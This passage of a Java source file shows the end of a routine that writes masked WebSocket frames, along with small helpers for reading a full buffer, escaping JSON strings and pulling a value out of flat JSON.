            else { outputStream.write(0x80 | 127); for (int i = 7; i >= 0; i--) outputStream.write((int)((len >> (8*i)) & 0xFF)); }
            outputStream.write(mask);
            byte[] masked = new byte[payload.length];
            for (int i = 0; i < payload.length; i++) masked[i] = (byte)(payload[i] ^ mask[i % 4]);
            outputStream.write(masked);
            outputStream.flush();
        }
    }

    private static void readFully(byte[] buf) throws IOException {
        int off = 0;
        while (off < buf.length) { int n = inputStream.read(buf, off, buf.length - off); if (n == -1) throw new IOException("EOF"); off += n; }
    }

    private static String escapeJson(String s) { return s.replace("\\", "\\\\").replace("\"", "\\\""); }

    /**
     * Simple JSON string extractor. Finds "key":"value" in text.
     * Works for flat JSON — doesn't handle nested objects for the key.
     */
    private static String extractJsonString(String json, String key) {
        String searchKey = "\"" + key + "\":\"";
        int start = json.indexOf(searchKey);
        if (start == -1) return null;
        start += searchKey.length();
        int end = json.indexOf("\"", start);
        if (end == -1) return null;
        return json.substring(start, end);
    }
}
